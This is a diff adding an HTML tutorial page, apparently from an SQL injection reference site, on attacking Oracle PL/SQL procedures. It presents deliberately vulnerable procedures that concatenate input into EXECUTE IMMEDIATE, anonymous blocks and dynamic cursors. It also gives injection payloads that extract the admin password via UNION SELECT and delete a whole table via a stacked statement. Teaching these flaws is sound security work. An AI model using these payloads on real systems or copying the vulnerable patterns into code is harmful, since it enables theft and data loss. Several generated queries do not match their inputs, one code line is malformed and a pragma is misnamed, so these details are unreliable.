@@ -1,0 +1,86 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>PL/SQL Attacks</title>
+</head><body>PL/SQL Attacks<br/>
+<br/>
+PL/SQL, like stored procedures, can be vulnerable to SQL injection attacks. When PL/SQL code integrates user input into a query and executes it, we encounter exactly the same problem we have when we build a classic dynamic query. In most cases, the attack is pretty similar to those presented in the tutorial. This article presents the different ways and situations where PL/SQL produres can be attacked. If you are interested to learn how to secure PL/SQL, take a look at the article about <a href="http://www.sqlinjection.net/defense/pl-sql/">preventing PL/SQL against SQL injections</a>.<br/>
+<br/>
+Execute Immediate<br/>
+<br/>
+This statement allows to execute a dynamic SQL query or an anonymous PL/SQL block. Let’s take a look at the code of a vulnerable PL/SQL procedure using EXECUTE IMMEDIATE statement. Keep in mind that this example was built for demonstration purposes only and you are not likely to find similar code in real situations.<br/>
+<br/>
+This PL/SQL code returns a product's description (second parameter).<br/>
+CREATE OR REPLACE PROCEDURE prodDescr(vname IN VARCHAR2, vresult OUT VARCHAR2) AS<br/>
+&nbsp; &nbsp;vsql &nbsp; &nbsp;VARCHAR2(4000);<br/>
+BEGIN<br/>
+&nbsp; &nbsp;vsql := 'SELECT description FROM products WHERE name=''' || vname || '''';<br/>
+&nbsp; &nbsp;EXECUTE IMMEDIATE vsql INTO vresult;<br/>
+END;<br/>
+<br/>
+The parameter is integrated in the query without being sanitized and a SQL injection vulnerability is created. Here is how it could be attacked.<br/>
+<br/>
+Malicious user input.<br/>
+A' AND 1=2 UNION SELECT password FROM members WHERE username='admin<br/>
+<br/>
+Generated Query.<br/>
+SELECT description FROM products WHERE name='A' OR 1=2 UNION SELECT password FROM members WHERE username='admin'<br/>
+<br/>
+When the query is executed, the attacker gets the administrator’s password. It is important to mention that Oracle does not allow executing multiple SQL statements in a single dynamic SQL call. The attacker will therefore be mostly limited to UNION attacks and WHERE clause manipulations. Nevertheless, it is possible to batch queries in the same call to EXECUTE IMMEDIATE when anonymous PL/SQL blocks are used.<br/>
+<br/>
+<b>Anonymous PL/SQL blocks</b><br/>
+<br/>
+Using anonymous PL/SQL blocks in an application is a fast way to get a query executed, however it can become extremely dangerous when using it with dynamic queries. It is especially interesting from the attacker perspective since it will be possible to inject multiple SQL statements. Here is an example of vulnerable anonymous block.<br/>
+<br/>
+PL/SQL procedure to increase the price of a product by $1.<br/>
+<br/>
+CREATE OR REPLACE PROCEDURE increasePrice ( vname IN VARCHAR2 ) AS<br/>
+BEGIN<br/>
+&nbsp; &nbsp;EXECUTE IMMEDIATE 'BEGIN UPDATE products SET price = price+1 WHERE name=''' || vname || '''; END;';<br/>
+END increasePrice;<br/>
+<br/>
+If you are wondering what an attack might look like for this particular PL/SQL here is an example:<br/>
+<br/>
+Malicious user input.<br/>
+zzzz'; DELETE FROM products WHERE 'a'='a<br/>
+<br/>
+Generated query.<br/>
+UPDATE products SET price = price+1 WHERE name'zzzz'; DELETE FROM products WHERE 'a'='a'<br/>
+<br/>
+With this crafted input, the anonymous PL/SQL block will increase the price of all products named zzzz and it will then delete all products in the database.<br/>
+<br/>
+<b>Dynamic Cursors</b><br/>
+<br/>
+PL/SQL allows dynamic cursors. They can be vulnerable to SQL injection too since they are dynamically generated just as execute immediate. Here is an example of vulnerable code.<br/>
+<br/>
+This PL/SQL does nothing - Simply using DBMS_OUTPUT for demonstration purpose.<br/>
+CREATE OR REPLACE PROCEDURE putlineDesc ( vname IN VARCHAR2 ) AS<br/>
+&nbsp; &nbsp;TYPE rcursor IS REF CURSOR;<br/>
+&nbsp; &nbsp;cur rcursor;<br/>
+&nbsp; &nbsp;vdesc VARCHAR2(1000);<br/>
+&nbsp; &nbsp;vsql VARCHAR2(4000);<br/>
+BEGIN<br/>
+&nbsp; &nbsp;vsql := 'SELECT description FROM products WHERE name=''' || vname || '''';<br/>
+&nbsp; &nbsp;OPEN cur FOR vsql;<br/>
+&nbsp; &nbsp;LOOP<br/>
+&nbsp; &nbsp; &nbsp; FETCH cur INTO vdesc<br/>
+&nbsp; &nbsp; &nbsp; EXIT WHEN cur%NOTFOUND;<br/>
+&nbsp; &nbsp; &nbsp; dbms_output.put_line(vdesc);<br/>
+&nbsp; &nbsp;END LOOP;<br/>
+&nbsp; &nbsp;CLOSE cur;<br/>
+END;<br/>
+<br/>
+The attack is pretty classic for this case. In fact, it could be identic to the first attack example shown in this article. Let's take a look at it.<br/>
+<br/>
+Malicious input<br/>
+A' AND 1=2 UNION SELECT password FROM members WHERE username='admin<br/>
+<br/>
+Generated query.<br/>
+SELECT description FROM products WHERE name=A' AND 1=2 UNION SELECT password FROM members WHERE username='admin<br/>
+<br/>
+Here again, all passwords would be returned to the attacker.<br/>
+<br/>
+<b>Limitations</b><br/>
+<br/>
+When attacking vulnerable PL/SQL code, you need to be aware that only string parameters can be exploited. Because the procedure defines parameter's data type, you will not be able to insert SQL segments in numeric values. Another common limitation with PL/SQL attacks is that it will be impossible to use DDL (Data Definition Language) except if function or procedure is idenfied as a PRAGMA_TRANSACTION.</body></html>
